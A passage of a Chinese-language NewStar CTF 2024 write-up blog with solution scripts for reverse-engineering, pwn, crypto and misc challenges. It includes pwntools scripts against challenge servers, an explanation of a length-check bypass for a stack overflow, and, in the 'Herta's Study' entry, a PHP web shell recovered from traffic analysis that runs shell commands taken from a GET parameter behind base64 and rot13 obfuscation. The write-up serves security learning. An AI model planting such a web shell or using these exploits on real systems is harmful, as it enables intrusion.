class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *<br>decoded = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    enc = get_byte(<span class="hljs-number">0x403020</span> + i)<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        enc = (enc + <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0xFF</span> <br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        enc = (enc - <span class="hljs-number">41</span>) &amp; <span class="hljs-number">0xFF</span> <br>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># i % 3 == 2</span><br>        enc ^= <span class="hljs-number">0x55</span><br>    decoded += <span class="hljs-built_in">chr</span>(enc)<br><span class="hljs-built_in">print</span>(decoded)<br></code></pre></td></tr></table></figure><h3 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h3><p>ida打开简单的看一下判断flag后会对密文进行解密</p><p><img src="/../../images/Newstar/2024/21.png" alt="15">可以用x64dbg打断点得到flag</p><p><img src="/../../images/Newstar/2024/20.png" alt="15"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Real-Login"><a href="#Real-Login" class="headerlink" title="Real Login"></a>Real Login</h3><p>有附件进行下载，ida的f5得到密钥，直接cat flag就行</p><p><img src="/../../images/Newstar/2024/15.png" alt="15"></p><h3 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>, <span class="hljs-number">30474</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Let&#x27;s play a game!&quot;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>) <br>    p.recvuntil(<span class="hljs-string">&quot;pls input you num: &quot;</span>)  <br>p.interactive() <br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/16.png" alt="16"></p><p>大概的思路就是在5u内填入数字最后大于999即可，然后就可以进入执行命令了</p><h3 id="overwrite"><a href="#overwrite" class="headerlink" title="overwrite"></a>overwrite</h3><p><img src="/../../images/Newstar/2024/17.png" alt="16"></p><p>有长度限制通过输入-1进行绕过，在read函数中会转换为unsigned int类型允许读取大量数据</p><p><code>nbytes_4</code> 在栈中有固定大小（0x30），填充 0x30 字节后，可以覆盖返回地址。</p><p><code>atoi</code> 的输入字符串在可处理的范围内（即不超过 <code>2147483647</code>），否则可能导致未定义行为，返回0</p><p>所以输入(0x30+0x06)个数字即可</p><p><img src="/../../images/Newstar/2024/18.png" alt="18"></p><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>ida简单的看一下</p><p><img src="/../../images/Newstar/2024/19.png"></p><p>用pwndbg进行查看，enc在<code>rbp-0x439</code>，<code>4557455355431d45</code>同时注意有不可见字符\x1d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;101.200.139.65&quot;</span>,<span class="hljs-number">25014</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;data:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&quot;\x5d\x1d\x43\x55\x53\x45\x57\x45&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/22.png" alt="18"></p><p>week2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br>url = <span class="hljs-string">&#x27;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/start&#x27;</span><br>res = session.get(url)<br><br>soup = BeautifulSoup(res.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>text = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>).get_text()<br>user_input = text<br><br>post_url = <span class="hljs-string">&#x27;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/submit&#x27;</span>  <span class="hljs-comment"># 替换为实际的 POST URL</span><br>data = &#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: user_input&#125;  <span class="hljs-comment"># 设置 POST 数据</span><br><br><span class="hljs-comment"># 发送 POST 请求</span><br>response = session.post(post_url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="Crypto-1"><a href="#Crypto-1" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="这是几次方？-疑惑！"><a href="#这是几次方？-疑惑！" class="headerlink" title="这是几次方？ 疑惑！"></a>这是几次方？ 疑惑！</h3><p>加法的运算逻辑在^之前</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 已知参数</span><br>n = <span class="hljs-number">124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span><br>hint = <span class="hljs-number">12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span><br><br><span class="hljs-comment"># 步骤 1: 恢复 p</span><br>p = hint ^ (e + <span class="hljs-number">10086</span>)<br><br><span class="hljs-comment"># 步骤 2: 计算 q</span><br>q = n // p<br><br><span class="hljs-comment"># 步骤 3: 计算 d (私钥)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br><br><span class="hljs-comment"># 步骤 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="Just-one-and-more-than-two"><a href="#Just-one-and-more-than-two" class="headerlink" title="Just one and more than two"></a>Just one and more than two</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 已知参数</span><br>p = <span class="hljs-number">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span><br>q = <span class="hljs-number">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span><br>r = <span class="hljs-number">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span><br>c1 = <span class="hljs-number">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span><br>c2 = <span class="hljs-number">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 步骤 1: 从 c1 解密</span><br>d1 = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, p)<br><br><span class="hljs-comment"># 步骤 2: 计算 N 和 phi(N)</span><br>N = p * q * r<br>phi_N = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) * (r - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 步骤 3: 从 c2 解密</span><br>d2 = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi_N)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, N)<br><br><span class="hljs-comment"># 拼接明文</span><br>flag = long_to_bytes(m1) + long_to_bytes(m2)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="Since-you-konw-something"><a href="#Since-you-konw-something" class="headerlink" title="Since you konw something"></a>Since you konw something</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_bytes</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b * (<span class="hljs-built_in">len</span>(a) // <span class="hljs-built_in">len</span>(b) + <span class="hljs-number">1</span>)))<br><br>c = <span class="hljs-number">218950457292639210021937048771508243745941011391746420225459726647571</span><br><br><span class="hljs-comment"># Convert c back to bytes</span><br>c_bytes = long_to_bytes(c)<br><br><span class="hljs-comment"># Function to try decryption with a given key</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_decrypt</span>(<span class="hljs-params">key</span>):<br>    decrypted = xor_bytes(c_bytes, key)<br>    <span class="hljs-keyword">if</span> decrypted.startswith(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>) <span class="hljs-keyword">and</span> decrypted.endswith(<span class="hljs-string">b&#x27;&#125;&#x27;</span>):<br>        <span class="hljs-keyword">return</span> decrypted.decode()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># Try all possible single-byte keys</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    key = <span class="hljs-built_in">bytes</span>([i])<br>    result = try_decrypt(key)<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found flag with key <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># If single-byte key doesn&#x27;t work, try short strings</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>    <span class="hljs-keyword">import</span> string<br>    <span class="hljs-keyword">import</span> itertools<br>    chars = string.printable.encode()<br>    <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>):  <span class="hljs-comment"># Try keys up to 4 characters long</span><br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> itertools.product(chars, repeat=length):<br>            key = <span class="hljs-built_in">bytes</span>(key)<br>            result = try_decrypt(key)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found flag with key <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> result:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not find the key. The key might be longer or more complex.&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="茶里茶气"><a href="#茶里茶气" class="headerlink" title="茶里茶气"></a>茶里茶气</h3><p>难得自己分析之后再叫ai写的</p><p>开头是一个类tea的算法，然后之后拼接转回hex再拼接一下就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">446302455051275584229157195942211</span><br>v0 = <span class="hljs-number">190997821330413928409069858571234</span><br>v1 = <span class="hljs-number">137340509740671759939138452113480</span><br><br>derta = <span class="hljs-number">462861781278454071588539315363</span><br>v3 = <span class="hljs-number">489552116384728571199414424951</span><br>v4 = <span class="hljs-number">469728069391226765421086670817</span><br>v5 = <span class="hljs-number">564098252372959621721124077407</span><br>v6 = <span class="hljs-number">335640247620454039831329381071</span><br><br>v2 = (derta * <span class="hljs-number">32</span>) % p<br><span class="hljs-comment"># 反向32次迭代的加密过程</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    v2 = (v2 - derta) % p<br>    v0 = (v0 - ((v1 + v2) ^ (<span class="hljs-number">8</span> * v1 + v5) ^ ((v1 &gt;&gt; <span class="hljs-number">7</span>) + v6))) % p<br>    v1 = (v1 - ((v0 + v2) ^ (<span class="hljs-number">8</span> * v0 + v3) ^ ((v0 &gt;&gt; <span class="hljs-number">7</span>) + v4))) % p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v0=&quot;</span>, v0)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v1=&quot;</span>, v1)<br>l = <span class="hljs-number">199</span><br>shift = l // <span class="hljs-number">2</span><br><br>combined = (v0 &lt;&lt; shift) + v1<br>a = <span class="hljs-built_in">hex</span>(combined)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>    a = <span class="hljs-string">&quot;0&quot;</span> + a<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a), <span class="hljs-number">2</span>)])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><h2 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h2><h3 id="wireshark-checkin"><a href="#wireshark-checkin" class="headerlink" title="wireshark_checkin"></a>wireshark_checkin</h3><p>wireshark打开http看一下追踪里面里面有flag</p><p><img src="/../../images/Newstar/2024/23.png" alt="23"></p><h3 id="wireshark-secret"><a href="#wireshark-secret" class="headerlink" title="wireshark_secret"></a>wireshark_secret</h3><p>导出图片得到flag</p><p><img src="/../../images/Newstar/2024/24.png" alt="24"></p><h3 id="热心助人的小明同学"><a href="#热心助人的小明同学" class="headerlink" title="热心助人的小明同学"></a>热心助人的小明同学</h3><p>Passware Kit Forensic工具一把梭</p><p><img src="/../../images/Newstar/2024/25.png" alt="25"></p><h3 id="用溯流仪见证伏特台风"><a href="#用溯流仪见证伏特台风" class="headerlink" title="用溯流仪见证伏特台风"></a>用溯流仪见证伏特台风</h3><p><a href="https://news.sina.com.cn/zx/gj/2024-07-08/doc-inccmcxn1550323.shtml#:~:text=4%E6%9C%8815%E6%97%A5%EF%BC%8C%E4%B8%AD%E5%9B%BD?qq-pf-to=pcqq.group">查找到网站</a>，定位到domain，进行16位小写md5得到flag</p><h3 id="你也玩原神吗"><a href="#你也玩原神吗" class="headerlink" title="你也玩原神吗"></a>你也玩原神吗</h3><p>gif提取内容</p><p><img src="/../../images/Newstar/2024/36.jpeg" alt="36"></p><p>原神真好玩😋，我直接手调</p><p><img src="/../../images/Newstar/2024/26.jpg" alt="26"></p><p>右下角的内容就行栅栏解密</p><p><img src="/../../images/Newstar/2024/27.png" alt="27"></p><h3 id="字里行间的秘密"><a href="#字里行间的秘密" class="headerlink" title="字里行间的秘密"></a>字里行间的秘密</h3><p>txt打开看下面的字符，零宽度隐写</p><p><img src="/../../images/Newstar/2024/28.png" alt="28"></p><p>带入解密，复制粘贴到txt里面即可得到flag</p><h3 id="Herta’s-Study"><a href="#Herta’s-Study" class="headerlink" title="Herta’s Study"></a>Herta’s Study</h3><p>加密逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-variable">$payload</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>];<br>    <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$payload</span>);<br>    <span class="hljs-variable">$bbb</span>=<span class="hljs-title function_ invoke__">create_function</span>(<br>        <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;J&#x27;</span>.<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-string">&#x27;T&#x27;</span>).<span class="hljs-string">&#x27;5z&#x27;</span>),   <br>        <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-string">&#x27;JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp</span><br><span class="hljs-string">        Kz0xKXsNCiAgICBpZigkaSUy&#x27;</span>.<span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-string">&#x27;CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m&#x27;</span>).<span class="hljs-string">&#x27;dHJfcm90MTMoJG5zWyRpXSk7DQo</span><br><span class="hljs-string">        gICAgfQ0KfQ0KcmV0dXJuICRuczs==&#x27;</span>)   <br>    );  <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$bbb</span>(<span class="hljs-variable">$payload</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单分析一下流量，中间传了一次假的flag后面传了一次真的，明显的&#x3D;&#x3D;，上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reverseEncryption</span>(<span class="hljs-params"><span class="hljs-variable">$ns</span></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ns</span>); <span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span> % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable">$ns</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$ns</span>[<span class="hljs-variable">$i</span>]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$ns</span>);<br>&#125;<br><span class="hljs-variable">$encryptedString</span> = <span class="hljs-string">&#x27;ZzxuZ3tmSQNsaGRsUmBsNzVOdKQkZaVZLa0tCt==&#x27;</span>; <br><span class="hljs-variable">$decryptedString</span> = <span class="hljs-title function_ invoke__">reverseEncryption</span>(<span class="hljs-variable">$encryptedString</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$decryptedString</span>;<br></code></pre></td></tr></table></figure><h2 id="Re-1"><a href="#Re-1" class="headerlink" title="Re"></a>Re</h2><h3 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h3><p>测试了一下，下载最新的upx脱壳，版本老的不行，简单的脱壳后发现是rc4,写解密脚本</p><p><img src="/../../images/Newstar/2024/29.png" alt="29"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_sbox</span>(<span class="hljs-params">key</span>):<br>    sbox = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + sbox[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i] <br><br>    <span class="hljs-keyword">return</span> sbox<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">key, data</span>):<br>    sbox = init_sbox(key)<br>    i = j = <span class="hljs-number">0</span><br>    output = []<br><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + sbox[i]) % <span class="hljs-number">256</span><br>        sbox[i], sbox[j] = sbox[j], sbox[i]  <span class="hljs-comment"># swap</span><br>        output.append(byte ^ sbox[(sbox[i] + sbox[j]) % <span class="hljs-number">256</span>])  <span class="hljs-comment"># xor</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(output)<br><br><span class="hljs-comment"># 定义 data（转换为无符号字节）</span><br>data = [<br>    <span class="hljs-number">196</span>, <span class="hljs-number">96</span>, <span class="hljs-number">175</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>, <span class="hljs-number">255</span>, <span class="hljs-number">46</span>, <span class="hljs-number">155</span>,<br>    <span class="hljs-number">245</span>, <span class="hljs-number">16</span>, <span class="hljs-number">86</span>, <span class="hljs-number">81</span>, <span class="hljs-number">110</span>, <span class="hljs-number">238</span>, <span class="hljs-number">95</span>, <span class="hljs-number">125</span>,<br>    <span class="hljs-number">125</span>, <span class="hljs-number">110</span>, <span class="hljs-number">43</span>, <span class="hljs-number">156</span>, <span class="hljs-number">117</span>, <span class="hljs-number">181</span><br>]<br><br>key = <span class="hljs-string">b&#x27;NewStar&#x27;</span><br><br>decrypted_flag = rc4(key, data)<br><span class="hljs-built_in">print</span>(decrypted_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br></code></pre></td></tr></table></figure><h3 id="drink-TEA"><a href="#drink-TEA" class="headerlink" title="drink_TEA"></a>drink_TEA</h3><p>先看加密逻辑</p><img src="/../../images/Newstar/2024/34.png" alt="34" style="zoom:67%;"><p><img src="/../../images/Newstar/2024/35.png" alt="35"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span 